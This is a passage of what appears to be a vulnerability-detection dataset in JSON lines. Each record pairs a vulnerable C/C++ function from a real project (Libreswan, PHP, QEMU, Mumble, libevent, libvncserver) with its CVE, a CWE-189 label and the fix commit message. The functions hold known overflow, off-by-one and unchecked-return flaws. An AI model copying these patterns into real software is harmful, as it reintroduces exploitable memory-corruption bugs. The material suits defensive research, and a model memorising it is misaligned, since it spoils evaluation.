*mdp;\n\tstruct state *st = NULL;\n\tint maj, min;\n\tenum state_kind from_state = STATE_UNDEFINED;   /* state we started in */\n\tstruct isakmp_hdr *hdr;\n\n#define SEND_NOTIFICATION(t) { \\\n\t\tif (st) \\\n\t\t\tsend_notification_from_state(st, from_state, t); \\\n\t\telse \\\n\t\t\tsend_notification_from_md(md, t); }\n\n\tif (!in_struct(&md->hdr, &isakmp_hdr_desc, &md->packet_pbs,\n\t\t       &md->message_pbs)) {\n\t\t/* Identify specific failures:\n\t\t * - bad ISAKMP major/minor version numbers\n\t\t */\n\t\tif (md->packet_pbs.roof - md->packet_pbs.cur >=\n\t\t    (ptrdiff_t)isakmp_hdr_desc.size) {\n\t\t\thdr = (struct isakmp_hdr *)md->packet_pbs.cur;\n\t\t\tmaj = (hdr->isa_version >> ISA_MAJ_SHIFT);\n\t\t\tmin = (hdr->isa_version & ISA_MIN_MASK);\n\n\t\t\tif ( maj != ISAKMP_MAJOR_VERSION &&\n\t\t\t     maj != IKEv2_MAJOR_VERSION) {\n\t\t\t\t/* We don't know IKEv3+ */\n\t\t\t\tSEND_NOTIFICATION(INVALID_MAJOR_VERSION);\n\t\t\t\treturn;\n\t\t\t} else if (maj == ISAKMP_MAJOR_VERSION && min !=\n\t\t\t\t   ISAKMP_MINOR_VERSION) {\n\t\t\t\t\t/* We only know IKEv1 1.0 */\n\t\t\t\t\tSEND_NOTIFICATION(INVALID_MINOR_VERSION);\n\t\t\t\t\treturn;\n\t\t\t}\n\t\t\t/* As per RFC 4306/5996, accept unknown IKEv2 minor */\n\t\t} else {\n\t\t\tlibreswan_log(\"received packet size (%lu) is smaller than \"\n\t\t\t\t\"an IKE header - packet dropped\", md->packet_pbs.roof - md->packet_pbs.cur);\n\t\t\tSEND_NOTIFICATION(PAYLOAD_MALFORMED);\n\t\t\treturn;\n\t\t}\n\t}\n\n\tif (md->packet_pbs.roof < md->message_pbs.roof) {\n\t\tlibreswan_log(\n\t\t\t\"received packet size (%u) is smaller than from \"\n\t\t\t\"size specified in ISAKMP HDR (%u) - packet dropped\",\n\t\t\t(unsigned) pbs_room(&md->packet_pbs),\n\t\t\tmd->hdr.isa_length);\n\t\t/* abort processing corrupt packet */\n\t\treturn;\n\t} else if (md->packet_pbs.roof > md->message_pbs.roof) {\n\t\t/*\n\t\t * Some (old?) versions of the Cisco VPN client send an additional\n\t\t * 16 bytes of zero bytes - Complain but accept it\n\t\t */\n\t\tDBG(DBG_CONTROL, {\n\t\t\tDBG_log(\n\t\t\t\"size (%u) in received packet is larger than the size \"\n\t\t\t\"specified in ISAKMP HDR (%u) - ignoring extraneous bytes\",\n\t\t\t(unsigned) pbs_room(&md->packet_pbs),\n\t\t\tmd->hdr.isa_length);\n\t\t\tDBG_dump(\"extraneous bytes:\", md->message_pbs.roof,\n\t\t\t\tmd->packet_pbs.roof - md->message_pbs.roof);\n\t\t/* continue */\n\t\t});\n\t}\n\n\tmaj = (md->hdr.isa_version >> ISA_MAJ_SHIFT);\n\tmin = (md->hdr.isa_version & ISA_MIN_MASK);\n\n\tDBG(DBG_CONTROL,\n\t    DBG_log(\n\t\t    \" processing version=%u.%u packet with exchange type=%s (%d)\",\n\t\t    maj, min,\n\t\t    enum_name(&exchange_names_ikev1orv2, md->hdr.isa_xchg),\n\t\t    md->hdr.isa_xchg));\n\n\tswitch (maj) {\n\tcase ISAKMP_MAJOR_VERSION:\n\t\tprocess_v1_packet(mdp);\n\t\tbreak;\n\n\tcase IKEv2_MAJOR_VERSION:\n\t\tprocess_v2_packet(mdp);\n\t\tbreak;\n\n\tdefault:\n\t\t/*\n\t\t * We should never get here? - above we only accept v1 or v2\n\t\t */\n\t\tlibreswan_log(\"Unexpected IKE major '%d'\",maj);\n\t\tSEND_NOTIFICATION(PAYLOAD_MALFORMED);\n\t\treturn;\n\t}\n}", "func_hash": 134270365742178901473475240907259102380, "file_name": "demux.c", "file_hash": 337063778717034257126509273824080866013, "cwe": ["CWE-189"], "cve": "CVE-2013-4564", "cve_desc": "Libreswan 3.6 allows remote attackers to cause a denial of service (crash) via a small length value and (1) no version or (2) an invalid major number in an IKE packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4564"}
{"idx": 200609, "project": "php-src", "commit_id": "158d8a6b088662ce9d31e0c777c6ebe90efdc854", "project_url": "https://github.com/php/php-src", "commit_url": "http://git.php.net/?p=php-src.git;a=commitdiff;h=158d8a6b088662ce9d31e0c777c6ebe90efdc854", "commit_message": "fix unchecked emalloc", "target": 1, "func": "static int phar_tar_process_metadata(phar_entry_info *entry, php_stream *fp TSRMLS_DC) /* {{{ */\n{\n\tchar *metadata;\n\tsize_t save = php_stream_tell(fp), read;\n\tphar_entry_info *mentry;\n\n\tmetadata = (char *) emalloc(entry->uncompressed_filesize + 1);\n\n\tread = php_stream_read(fp, metadata, entry->uncompressed_filesize);\n\tif (read != entry->uncompressed_filesize) {\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (phar_parse_metadata(&metadata, &entry->metadata, entry->uncompressed_filesize TSRMLS_CC) == FAILURE) {\n\t\t/* if not valid serialized data, it is a regular string */\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (entry->filename_len == sizeof(\".phar/.metadata.bin\")-1 && !memcmp(entry->filename, \".phar/.metadata.bin\", sizeof(\".phar/.metadata.bin\")-1)) {\n\t\tentry->phar->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t} else if (entry->filename_len >= sizeof(\".phar/.metadata/\") + sizeof(\"/.metadata.bin\") - 1 && SUCCESS == zend_hash_find(&(entry->phar->manifest), entry->filename + sizeof(\".phar/.metadata/\") - 1, entry->filename_len - (sizeof(\"/.metadata.bin\") - 1 + sizeof(\".phar/.metadata/\") - 1), (void *)&mentry)) {\n\t\t/* transfer this metadata to the entry it refers */\n\t\tmentry->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t}\n\n\tefree(metadata);\n\tphp_stream_seek(fp, save, SEEK_SET);\n\treturn SUCCESS;\n}", "func_hash": 65364156517998686877773638370915497483, "file_name": "tar.c", "file_hash": 149503072447606832247607022426732649084, "cwe": ["CWE-189"], "cve": "CVE-2012-2386", "cve_desc": "Integer overflow in the phar_parse_tarfile function in tar.c in the phar extension in PHP before 5.3.14 and 5.4.x before 5.4.4 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted tar file that triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2386"}
{"idx": 200657, "project": "qemu", "commit_id": "940973ae0b45c9b6817bab8e4cf4df99a9ef83d7", "project_url": "https://github.com/bonzini/qemu", "commit_url": "http://git.qemu.org/?p=qemu.git;a=commit;h=940973ae0b45c9b6817bab8e4cf4df99a9ef83d7", "commit_message": "ide: Correct improper smart self test counter reset in ide core.\n\nThe SMART self test counter was incorrectly being reset to zero,\nnot 1. This had the effect that on every 21st SMART EXECUTE OFFLINE:\n * We would write off the beginning of a dynamically allocated buffer\n * We forgot the SMART history\nFix this.\n\nSigned-off-by: Benoit Canet <benoit@irqsave.net>\nMessage-id: 1397336390-24664-1-git-send-email-benoit.canet@irqsave.net\nReviewed-by: Markus Armbruster <armbru@redhat.com>\nCc: qemu-stable@nongnu.org\nAcked-by: Kevin Wolf <kwolf@redhat.com>\n[PMM: tweaked commit message as per suggestions from Markus]\nSigned-off-by: Peter Maydell <peter.maydell@linaro.org>", "target": 1, "func": "static bool cmd_smart(IDEState *s, uint8_t cmd)\n{\n    int n;\n\n    if (s->hcyl != 0xc2 || s->lcyl != 0x4f) {\n        goto abort_cmd;\n    }\n\n    if (!s->smart_enabled && s->feature != SMART_ENABLE) {\n        goto abort_cmd;\n    }\n\n    switch (s->feature) {\n    case SMART_DISABLE:\n        s->smart_enabled = 0;\n        return true;\n\n    case SMART_ENABLE:\n        s->smart_enabled = 1;\n        return true;\n\n    case SMART_ATTR_AUTOSAVE:\n        switch (s->sector) {\n        case 0x00:\n            s->smart_autosave = 0;\n            break;\n        case 0xf1:\n            s->smart_autosave = 1;\n            break;\n        default:\n            goto abort_cmd;\n        }\n        return true;\n\n    case SMART_STATUS:\n        if (!s->smart_errors) {\n            s->hcyl = 0xc2;\n            s->lcyl = 0x4f;\n        } else {\n            s->hcyl = 0x2c;\n            s->lcyl = 0xf4;\n        }\n        return true;\n\n    case SMART_READ_THRESH:\n        memset(s->io_buffer, 0, 0x200);\n        s->io_buffer[0] = 0x01; /* smart struct version */\n\n        for (n = 0; n < ARRAY_SIZE(smart_attributes); n++) {\n            s->io_buffer[2 + 0 + (n * 12)] = smart_attributes[n][0];\n            s->io_buffer[2 + 1 + (n * 12)] = smart_attributes[n][11];\n        }\n\n        /* checksum */\n        for (n = 0; n < 511; n++) {\n            s->io_buffer[511] += s->io_buffer[n];\n        }\n        s->io_buffer[511] = 0x100 - s->io_buffer[511];\n\n        s->status = READY_STAT | SEEK_STAT;\n        ide_transfer_start(s, s->io_buffer, 0x200, ide_transfer_stop);\n        ide_set_irq(s->bus);\n        return false;\n\n    case SMART_READ_DATA:\n        memset(s->io_buffer, 0, 0x200);\n        s->io_buffer[0] = 0x01; /* smart struct version */\n\n        for (n = 0; n < ARRAY_SIZE(smart_attributes); n++) {\n            int i;\n            for (i = 0; i < 11; i++) {\n                s->io_buffer[2 + i + (n * 12)] = smart_attributes[n][i];\n            }\n        }\n\n        s->io_buffer[362] = 0x02 | (s->smart_autosave ? 0x80 : 0x00);\n        if (s->smart_selftest_count == 0) {\n            s->io_buffer[363] = 0;\n        } else {\n            s->io_buffer[363] =\n                s->smart_selftest_data[3 +\n                           (s->smart_selftest_count - 1) *\n                           24];\n        }\n        s->io_buffer[364] = 0x20;\n        s->io_buffer[365] = 0x01;\n        /* offline data collection capacity: execute + self-test*/\n        s->io_buffer[367] = (1 << 4 | 1 << 3 | 1);\n        s->io_buffer[368] = 0x03; /* smart capability (1) */\n        s->io_buffer[369] = 0x00; /* smart capability (2) */\n        s->io_buffer[370] = 0x01; /* error logging supported */\n        s->io_buffer[372] = 0x02; /* minutes for poll short test */\n        s->io_buffer[373] = 0x36; /* minutes for poll ext test */\n        s->io_buffer[374] = 0x01; /* minutes for poll conveyance */\n\n        for (n = 0; n < 511; n++) {\n            s->io_buffer[511] += s->io_buffer[n];\n        }\n        s->io_buffer[511] = 0x100 - s->io_buffer[511];\n\n        s->status = READY_STAT | SEEK_STAT;\n        ide_transfer_start(s, s->io_buffer, 0x200, ide_transfer_stop);\n        ide_set_irq(s->bus);\n        return false;\n\n    case SMART_READ_LOG:\n        switch (s->sector) {\n        case 0x01: /* summary smart error log */\n            memset(s->io_buffer, 0, 0x200);\n            s->io_buffer[0] = 0x01;\n            s->io_buffer[1] = 0x00; /* no error entries */\n            s->io_buffer[452] = s->smart_errors & 0xff;\n            s->io_buffer[453] = (s->smart_errors & 0xff00) >> 8;\n\n            for (n = 0; n < 511; n++) {\n                s->io_buffer[511] += s->io_buffer[n];\n            }\n            s->io_buffer[511] = 0x100 - s->io_buffer[511];\n            break;\n        case 0x06: /* smart self test log */\n            memset(s->io_buffer, 0, 0x200);\n            s->io_buffer[0] = 0x01;\n            if (s->smart_selftest_count == 0) {\n                s->io_buffer[508] = 0;\n            } else {\n                s->io_buffer[508] = s->smart_selftest_count;\n                for (n = 2; n < 506; n++)  {\n                    s->io_buffer[n] = s->smart_selftest_data[n];\n                }\n            }\n\n            for (n = 0; n < 511; n++) {\n                s->io_buffer[511] += s->io_buffer[n];\n            }\n            s->io_buffer[511] = 0x100 - s->io_buffer[511];\n            break;\n        default:\n            goto abort_cmd;\n        }\n        s->status = READY_STAT | SEEK_STAT;\n        ide_transfer_start(s, s->io_buffer, 0x200, ide_transfer_stop);\n        ide_set_irq(s->bus);\n        return false;\n\n    case SMART_EXECUTE_OFFLINE:\n        switch (s->sector) {\n        case 0: /* off-line routine */\n        case 1: /* short self test */\n        case 2: /* extended self test */\n            s->smart_selftest_count++;\n            if (s->smart_selftest_count > 21) {\n                s->smart_selftest_count = 0;\n            }\n            n = 2 + (s->smart_selftest_count - 1) * 24;\n            s->smart_selftest_data[n] = s->sector;\n            s->smart_selftest_data[n + 1] = 0x00; /* OK and finished */\n            s->smart_selftest_data[n + 2] = 0x34; /* hour count lsb */\n            s->smart_selftest_data[n + 3] = 0x12; /* hour count msb */\n            break;\n        default:\n            goto abort_cmd;\n        }\n        return true;\n    }\n\nabort_cmd:\n    ide_abort_command(s);\n    return true;\n}", "func_hash": 317507375239169265876366212102662278628, "file_name": "core.c", "file_hash": 238980910314922299787352231914135369576, "cwe": ["CWE-189"], "cve": "CVE-2014-2894", "cve_desc": "Off-by-one error in the cmd_smart function in the smart self test in hw/ide/core.c in QEMU before 2.0 allows local users to have unspecified impact via a SMART EXECUTE OFFLINE command that triggers a buffer underflow and memory corruption.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2894"}
{"idx": 202637, "project": "mumble", "commit_id": "d3be3d7b96a5130e4b20f23e327b040ea4d0b079", "project_url": "https://github.com/mumble-voip/mumble", "commit_url": "https://github.com/mumble-voip/mumble/commit/d3be3d7b96a5130e4b20f23e327b040ea4d0b079", "commit_message": "mumble: fix Mumble-SA-2014-002 (CVE-2014-0045).", "target": 1, "func": "bool AudioOutputSpeech::needSamples(unsigned int snum) {\n\tfor (unsigned int i=iLastConsume;i<iBufferFilled;++i)\n\t\tpfBuffer[i-iLastConsume]=pfBuffer[i];\n\tiBufferFilled -= iLastConsume;\n\n\tiLastConsume = snum;\n\n\tif (iBufferFilled >= snum)\n\t\treturn bLastAlive;\n\n\tfloat *pOut;\n\tbool nextalive = bLastAlive;\n\n\twhile (iBufferFilled < snum) {\n\t\tint decodedSamples = iFrameSize;\n\t\tresizeBuffer(iBufferFilled + iOutputSize);\n\n\t\tpOut = (srs) ? fResamplerBuffer : (pfBuffer + iBufferFilled);\n\n\t\tif (! bLastAlive) {\n\t\t\tmemset(pOut, 0, iFrameSize * sizeof(float));\n\t\t} else {\n\t\t\tif (p == &LoopUser::lpLoopy) {\n\t\t\t\tLoopUser::lpLoopy.fetchFrames();\n\t\t\t}\n\n\t\t\tint avail = 0;\n\t\t\tint ts = jitter_buffer_get_pointer_timestamp(jbJitter);\n\t\t\tjitter_buffer_ctl(jbJitter, JITTER_BUFFER_GET_AVAILABLE_COUNT, &avail);\n\n\t\t\tif (p && (ts == 0)) {\n\t\t\t\tint want = iroundf(p->fAverageAvailable);\n\t\t\t\tif (avail < want) {\n\t\t\t\t\t++iMissCount;\n\t\t\t\t\tif (iMissCount < 20) {\n\t\t\t\t\t\tmemset(pOut, 0, iFrameSize * sizeof(float));\n\t\t\t\t\t\tgoto nextframe;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (qlFrames.isEmpty()) {\n\t\t\t\tQMutexLocker lock(&qmJitter);\n\n\t\t\t\tchar data[4096];\n\t\t\t\tJitterBufferPacket jbp;\n\t\t\t\tjbp.data = data;\n\t\t\t\tjbp.len = 4096;\n\n\t\t\t\tspx_int32_t startofs = 0;\n\n\t\t\t\tif (jitter_buffer_get(jbJitter, &jbp, iFrameSize, &startofs) == JITTER_BUFFER_OK) {\n\t\t\t\t\tPacketDataStream pds(jbp.data, jbp.len);\n\n\t\t\t\t\tiMissCount = 0;\n\t\t\t\t\tucFlags = static_cast<unsigned char>(pds.next());\n\n\t\t\t\t\tbHasTerminator = false;\n\t\t\t\t\tif (umtType == MessageHandler::UDPVoiceOpus) {\n\t\t\t\t\t\tint size;\n\t\t\t\t\t\tpds >> size;\n\n\t\t\t\t\t\tbHasTerminator = size & 0x2000;\n\t\t\t\t\t\tqlFrames << pds.dataBlock(size & 0x1fff);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tunsigned int header = 0;\n\t\t\t\t\t\tdo {\n\t\t\t\t\t\t\theader = static_cast<unsigned int>(pds.next());\n\t\t\t\t\t\t\tif (header)\n\t\t\t\t\t\t\t\tqlFrames << pds.dataBlock(header & 0x7f);\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tbHasTerminator = true;\n\t\t\t\t\t\t} while ((header & 0x80) && pds.isValid());\n\t\t\t\t\t}\n\n\t\t\t\t\tif (pds.left()) {\n\t\t\t\t\t\tpds >> fPos[0];\n\t\t\t\t\t\tpds >> fPos[1];\n\t\t\t\t\t\tpds >> fPos[2];\n\t\t\t\t\t} else {\n\t\t\t\t\t\tfPos[0] = fPos[1] = fPos[2] = 0.0f;\n\t\t\t\t\t}\n\n\t\t\t\t\tif (p) {\n\t\t\t\t\t\tfloat a = static_cast<float>(avail);\n\t\t\t\t\t\tif (avail >= p->fAverageAvailable)\n\t\t\t\t\t\t\tp->fAverageAvailable = a;\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tp->fAverageAvailable *= 0.99f;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tjitter_buffer_update_delay(jbJitter, &jbp, NULL);\n\n\t\t\t\t\tiMissCount++;\n\t\t\t\t\tif (iMissCount > 10)\n\t\t\t\t\t\tnextalive = false;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (! qlFrames.isEmpty()) {\n\t\t\t\tQByteArray qba = qlFrames.takeFirst();\n\n\t\t\t\tif (umtType == MessageHandler::UDPVoiceCELTAlpha || umtType == MessageHandler::UDPVoiceCELTBeta) {\n\t\t\t\t\tint wantversion = (umtType == MessageHandler::UDPVoiceCELTAlpha) ? g.iCodecAlpha : g.iCodecBeta;\n\t\t\t\t\tif ((p == &LoopUser::lpLoopy) && (! g.qmCodecs.isEmpty())) {\n\t\t\t\t\t\tQMap<int, CELTCodec *>::const_iterator i = g.qmCodecs.constEnd();\n\t\t\t\t\t\t--i;\n\t\t\t\t\t\twantversion = i.key();\n\t\t\t\t\t}\n\t\t\t\t\tif (cCodec && (cCodec->bitstreamVersion() != wantversion)) {\n\t\t\t\t\t\tcCodec->celt_decoder_destroy(cdDecoder);\n\t\t\t\t\t\tcdDecoder = NULL;\n\t\t\t\t\t}\n\t\t\t\t\tif (! cCodec) {\n\t\t\t\t\t\tcCodec = g.qmCodecs.value(wantversion);\n\t\t\t\t\t\tif (cCodec) {\n\t\t\t\t\t\t\tcdDecoder = cCodec->decoderCreate();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif (cdDecoder)\n\t\t\t\t\t\tcCodec->decode_float(cdDecoder, qba.isEmpty() ? NULL : reinterpret_cast<const unsigned char *>(qba.constData()), qba.size(), pOut);\n\t\t\t\t\telse\n\t\t\t\t\t\tmemset(pOut, 0, sizeof(float) * iFrameSize);\n\t\t\t\t} else if (umtType == MessageHandler::UDPVoiceOpus) {\n#ifdef USE_OPUS\n\t\t\t\t\tdecodedSamples = opus_decode_float(opusState,\n\t\t\t\t\t                                   qba.isEmpty() ?\n\t\t\t\t\t                                       NULL :\n\t\t\t\t\t                                       reinterpret_cast<const unsigned char *>(qba.constData()),\n\t\t\t\t\t                                   qba.size(),\n\t\t\t\t\t                                   pOut,\n\t\t\t\t\t                                   iAudioBufferSize,\n\t\t\t\t\t                                   0);\n#endif\n\t\t\t\t} else {\n\t\t\t\t\tif (qba.isEmpty()) {\n\t\t\t\t\t\tspeex_decode(dsSpeex, NULL, pOut);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tspeex_bits_read_from(&sbBits, qba.data(), qba.size());\n\t\t\t\t\t\tspeex_decode(dsSpeex, &sbBits, pOut);\n\t\t\t\t\t}\n\t\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\t\tpOut[i] *= (1.0f / 32767.f);\n\t\t\t\t}\n\n\t\t\t\tbool update = true;\n\t\t\t\tif (p) {\n\t\t\t\t\tfloat &fPowerMax = p->fPowerMax;\n\t\t\t\t\tfloat &fPowerMin = p->fPowerMin;\n\n\t\t\t\t\tfloat pow = 0.0f;\n\t\t\t\t\tfor (int i = 0; i < decodedSamples; ++i)\n\t\t\t\t\t\tpow += pOut[i] * pOut[i];\n\t\t\t\t\tpow = sqrtf(pow / static_cast<float>(decodedSamples));\n\n\t\t\t\t\tif (pow >= fPowerMax) {\n\t\t\t\t\t\tfPowerMax = pow;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (pow <= fPowerMin) {\n\t\t\t\t\t\t\tfPowerMin = pow;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tfPowerMax = 0.99f * fPowerMax;\n\t\t\t\t\t\t\tfPowerMin += 0.0001f * pow;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tupdate = (pow < (fPowerMin + 0.01f * (fPowerMax - fPowerMin)));\n\t\t\t\t}\n\t\t\t\tif (qlFrames.isEmpty() && update)\n\t\t\t\t\tjitter_buffer_update_delay(jbJitter, NULL, NULL);\n\n\t\t\t\tif (qlFrames.isEmpty() && bHasTerminator)\n\t\t\t\t\tnextalive = false;\n\t\t\t} else {\n\t\t\t\tif (umtType == MessageHandler::UDPVoiceCELTAlpha || umtType == MessageHandler::UDPVoiceCELTBeta) {\n\t\t\t\t\tif (cdDecoder)\n\t\t\t\t\t\tcCodec->decode_float(cdDecoder, NULL, 0, pOut);\n\t\t\t\t\telse\n\t\t\t\t\t\tmemset(pOut, 0, sizeof(float) * iFrameSize);\n\t\t\t\t} else if (umtType == MessageHandler::UDPVoiceOpus) {\n#ifdef USE_OPUS\n\t\t\t\t\tdecodedSamples = opus_decode_float(opusState, NULL, 0, pOut, iFrameSize, 0);\n#endif\n\t\t\t\t} else {\n\t\t\t\t\tspeex_decode(dsSpeex, NULL, pOut);\n\t\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\t\tpOut[i] *= (1.0f / 32767.f);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (! nextalive) {\n\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\tpOut[i] *= fFadeOut[i];\n\t\t\t} else if (ts == 0) {\n\t\t\t\tfor (unsigned int i=0;i<iFrameSize;++i)\n\t\t\t\t\tpOut[i] *= fFadeIn[i];\n\t\t\t}\n\n\t\t\tfor (int i = decodedSamples / iFrameSize; i > 0; --i) {\n\t\t\t\tjitter_buffer_tick(jbJitter);\n\t\t\t}\n\t\t}\nnextframe:\n\t\tspx_uint32_t inlen = decodedSamples;\n\t\tspx_uint32_t outlen = static_cast<unsigned int>(ceilf(static_cast<float>(decodedSamples * iMixerFreq) / static_cast<float>(iSampleRate)));\n\t\tif (srs && bLastAlive)\n\t\t\tspeex_resampler_process_float(srs, 0, fResamplerBuffer, &inlen, pfBuffer + iBufferFilled, &outlen);\n\t\tiBufferFilled += outlen;\n\t}\n\n\tif (p) {\n\t\tSettings::TalkState ts;\n\t\tif (! nextalive)\n\t\t\tucFlags = 0xFF;\n\t\tswitch (ucFlags) {\n\t\t\tcase 0:\n\t\t\t\tts = Settings::Talking;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tts = Settings::Shouting;\n\t\t\t\tbreak;\n\t\t\tcase 0xFF:\n\t\t\t\tts = Settings::Passive;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tts = Settings::Whispering;\n\t\t\t\tbreak;\n\t\t}\n\t\tp->setTalking(ts);\n\t}\n\n\tbool tmp = bLastAlive;\n\tbLastAlive = nextalive;\n\treturn tmp;\n}", "func_hash": 215357927557034234388644673331854808188, "file_name": "AudioOutputSpeech.cpp", "file_hash": 267424787523206792756224607627620594321, "cwe": ["CWE-189"], "cve": "CVE-2014-0045", "cve_desc": "The needSamples method in AudioOutputSpeech.cpp in the client in Mumble 1.2.4 and the 1.2.3 pre-release snapshots, Mumble for iOS 1.1 through 1.2.2, and MumbleKit before commit fd190328a9b24d37382b269a5674b0c0c7a7e36d does not check the return value of the opus_decode_float function, which allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted Opus voice packet, which triggers an error in opus_decode_float, a conversion of a negative integer to an unsigned integer, and a heap-based buffer over-read and over-write.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0045"}
{"idx": 202743, "project": "libevent", "commit_id": "7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "project_url": "https://github.com/libevent/libevent", "commit_url": "https://github.com/libevent/libevent/commit/7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "commit_message": "Fix CVE-2014-6272 in Libevent 1.4\n\nFor this fix, we need to make sure that passing too-large inputs to\nthe evbuffer functions can't make us do bad things with the heap.", "target": 1, "func": "evbuffer_expand(struct evbuffer *buf, size_t datlen)\n{\n\tsize_t need = buf->misalign + buf->off + datlen;\n\n\t/* If we can fit all the data, then we don't have to do anything */\n\tif (buf->totallen >= need)\n\t\treturn (0);\n\n\t/*\n\t * If the misalignment fulfills our data needs, we just force an\n\t * alignment to happen.  Afterwards, we have enough space.\n\t */\n\tif (buf->misalign >= datlen) {\n\t\tevbuffer_align(buf);\n\t} else {\n\t\tvoid *newbuf;\n\t\tsize_t length = buf->totallen;\n\n\t\tif (length < 256)\n\t\t\tlength = 256;\n\t\twhile (length < need)\n\t\t\tlength <<= 1;\n\n\t\tif (buf->orig_buffer != buf->buffer)\n\t\t\tevbuffer_align(buf);\n\t\tif ((newbuf = realloc(buf->buffer, length)) == NULL)\n\t\t\treturn (-1);\n\n\t\tbuf->orig_buffer = buf->buffer = newbuf;\n\t\tbuf->totallen = length;\n\t}\n\n\treturn (0);\n}", "func_hash": 258002302375317434501370385113960518156, "file_name": "buffer.c", "file_hash": 249511286500344069653833490038905481379, "cwe": ["CWE-189"], "cve": "CVE-2014-6272", "cve_desc": "Multiple integer overflows in the evbuffer API in Libevent 1.4.x before 1.4.15, 2.0.x before 2.0.22, and 2.1.x before 2.1.5-beta allow context-dependent attackers to cause a denial of service or possibly have other unspecified impact via \"insanely large inputs\" to the (1) evbuffer_add, (2) evbuffer_expand, or (3) bufferevent_write function, which triggers a heap-based buffer overflow or an infinite loop.  NOTE: this identifier has been SPLIT per ADT3 due to different affected versions. See CVE-2015-6525 for the functions that are only affected in 2.0 and later.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6272"}
{"idx": 202744, "project": "libevent", "commit_id": "7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "project_url": "https://github.com/libevent/libevent", "commit_url": "https://github.com/libevent/libevent/commit/7b21c4eabf1f3946d3f63cce1319c490caab8ecf", "commit_message": "Fix CVE-2014-6272 in Libevent 1.4\n\nFor this fix, we need to make sure that passing too-large inputs to\nthe evbuffer functions can't make us do bad things with the heap.", "target": 1, "func": "evbuffer_add(struct evbuffer *buf, const void *data, size_t datlen)\n{\n\tsize_t need = buf->misalign + buf->off + datlen;\n\tsize_t oldoff = buf->off;\n\n\tif (buf->totallen < need) {\n\t\tif (evbuffer_expand(buf, datlen) == -1)\n\t\t\treturn (-1);\n\t}\n\n\tmemcpy(buf->buffer + buf->off, data, datlen);\n\tbuf->off += datlen;\n\n\tif (datlen && buf->cb != NULL)\n\t\t(*buf->cb)(buf, oldoff, buf->off, buf->cbarg);\n\n\treturn (0);\n}", "func_hash": 5736669242917228519449331973230891722, "file_name": "buffer.c", "file_hash": 249511286500344069653833490038905481379, "cwe": ["CWE-189"], "cve": "CVE-2014-6272", "cve_desc": "Multiple integer overflows in the evbuffer API in Libevent 1.4.x before 1.4.15, 2.0.x before 2.0.22, and 2.1.x before 2.1.5-beta allow context-dependent attackers to cause a denial of service or possibly have other unspecified impact via \"insanely large inputs\" to the (1) evbuffer_add, (2) evbuffer_expand, or (3) bufferevent_write function, which triggers a heap-based buffer overflow or an infinite loop.  NOTE: this identifier has been SPLIT per ADT3 due to different affected versions. See CVE-2015-6525 for the functions that are only affected in 2.0 and later.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6272"}
{"idx": 204443, "project": "libvncserver", "commit_id": "05a9bd41a8ec0a9d580a8f420f41718bdd235446", "project_url": "https://github.com/LibVNC/libvncserver", "commit_url": "https://github.com/newsoft/libvncserver/commit/05a9bd41a8ec0a9d580a8f420f41718bdd235446", "commit_message": "Do not accept a scaling factor of zero on PalmVNCSetScaleFactor and SetScale client->server messages. This would cause a division by zero and crash the server.", "target": 1, "func": "rfbProcessClientNormalMessage(rfbClientPtr cl)\n{\n    int n=0;\n    rfbClientToServerMsg msg;\n    char *str;\n    int i;\n    uint32_t enc=0;\n    uint32_t lastPreferredEncoding = -1;\n    char encBuf[64];\n    char encBuf2[64];\n\n#ifdef LIBVNCSERVER_WITH_WEBSOCKETS\n    if (cl->wsctx && webSocketCheckDisconnect(cl))\n      return;\n#endif\n\n    if ((n = rfbReadExact(cl, (char *)&msg, 1)) <= 0) {\n        if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n        rfbCloseClient(cl);\n        return;\n    }\n\n    switch (msg.type) {\n\n    case rfbSetPixelFormat:\n\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbSetPixelFormatMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n\n        cl->format.bitsPerPixel = msg.spf.format.bitsPerPixel;\n        cl->format.depth = msg.spf.format.depth;\n        cl->format.bigEndian = (msg.spf.format.bigEndian ? TRUE : FALSE);\n        cl->format.trueColour = (msg.spf.format.trueColour ? TRUE : FALSE);\n        cl->format.redMax = Swap16IfLE(msg.spf.format.redMax);\n        cl->format.greenMax = 